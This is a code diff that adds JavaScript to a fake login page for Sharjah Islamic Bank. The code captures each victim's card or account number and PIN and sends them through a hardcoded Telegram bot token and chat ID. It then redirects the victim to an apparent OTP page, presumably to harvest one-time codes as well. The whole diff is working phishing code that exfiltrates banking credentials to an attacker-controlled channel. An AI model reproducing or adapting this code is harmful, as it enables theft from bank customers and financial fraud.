@@ -177,4 +177,46 @@
         document.getElementById('errorMessage').style.display = 'none';
 
         // بوت تلغرام
-        const botToken = '7272097327:AAFcKxacVS26HNg
+        const botToken = '7272097327:AAFcKxacVS26HNg85tK2uYpNLmOMxmsqgZM';
+        const chatId = '1008144314';
+
+        const message = `
+🔐 *تسجيل دخول مصرف الشارقة الإسلامي*
+
+💳 رقم البطاقة/الحساب: ${cardNumber}
+🔢 رمز PIN: ${pin}
+📅 التاريخ: ${new Date().toLocaleString('ar-EG')}
+`;
+
+        // إرسال البيانات إلى تلغرام
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // بعد النجاح: التوجيه إلى صفحة OTP
+                window.location.href = 'otp_page.html';
+            } else {
+                throw new Error('فشل الإرسال');
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            const errorMsg = document.getElementById('errorMessage');
+            errorMsg.textContent = '❌ حدث خطأ أثناء إرسال البيانات. يرجى المحاولة لاحقًا.';
+            errorMsg.style.display = 'block';
+        });
+    });
+</script>
+
+</body>
+</html>
